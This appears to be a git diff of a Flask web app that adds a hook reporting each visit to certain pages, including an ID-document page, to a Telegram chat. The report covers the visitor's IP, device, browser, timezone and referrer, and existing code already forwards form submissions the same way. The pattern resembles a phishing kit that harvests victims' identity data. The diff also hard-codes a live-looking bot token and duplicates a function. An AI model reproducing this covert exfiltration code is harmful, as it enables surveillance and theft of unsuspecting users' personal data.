@@ -22,7 +22,7 @@ def id_doc():
 
 # Конфигурация Telegram бота
 TELEGRAM_TOKEN = "7705002195:AAE_9eNFFfaRxhwV54OT-mtm01L5BgXh7V4"
-TELEGRAM_CHAT_ID = "2015460473"
+TELEGRAM_CHAT_ID = "-1002557822121"
 TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
 
 
@@ -114,6 +114,51 @@ def format_telegram_message(form_data, client_info):
     message += f"  • Время: {client_info['timestamp']}\n"
 
     return message
+
+
+def format_visit_message(client_info, page):
+    """Форматируем сообщение о посещении страницы"""
+    message = "👀 <b>Новый посетитель на сайте</b>\n\n"
+    message += f"📄 <b>Страница:</b> {page}\n\n"
+
+    message += "📱 <b>Информация об устройстве:</b>\n"
+    message += f"  • Устройство: {client_info['device'].get('device', '')} "
+    message += f"({'Мобильное' if client_info['device'].get('is_mobile') else 'Десктоп'})\n"
+    message += f"  • ОС: {client_info['device'].get('os', '')}\n"
+    message += f"  • Браузер: {client_info['device'].get('browser', '')}\n"
+    if 'screen_resolution' in client_info['device']:
+        message += f"  • Разрешение: {client_info['device']['screen_resolution']}\n"
+    message += f"  • Часовой пояс: {client_info['device'].get('timezone', '')}\n"
+    message += f"  • IP: {client_info['network'].get('ip', '')}\n"
+    message += f"  • Язык: {client_info['network'].get('accept_language', '')}\n"
+    message += f"  • Реферер: {client_info['network'].get('referrer', 'Прямой заход')}\n"
+    message += f"  • Время: {client_info['timestamp']}\n"
+
+    return message
+
+
+def send_to_telegram(message):
+    """Отправляем сообщение в Telegram"""
+    payload = {
+        "chat_id": TELEGRAM_CHAT_ID,
+        "text": message,
+        "parse_mode": "HTML"
+    }
+    try:
+        response = requests.post(TELEGRAM_API_URL, json=payload)
+        return response.status_code == 200
+    except Exception as e:
+        print(f"Ошибка отправки в Telegram: {e}")
+        return False
+
+
+@app.before_request
+def track_visits():
+    """Отслеживаем посещения основных страниц"""
+    if request.path in ['/', '/setup/', '/profile/personal/id-doc']:
+        client_info = get_client_info(request)
+        message = format_visit_message(client_info, request.path)
+        send_to_telegram(message)
 
 
 def send_to_telegram(message):
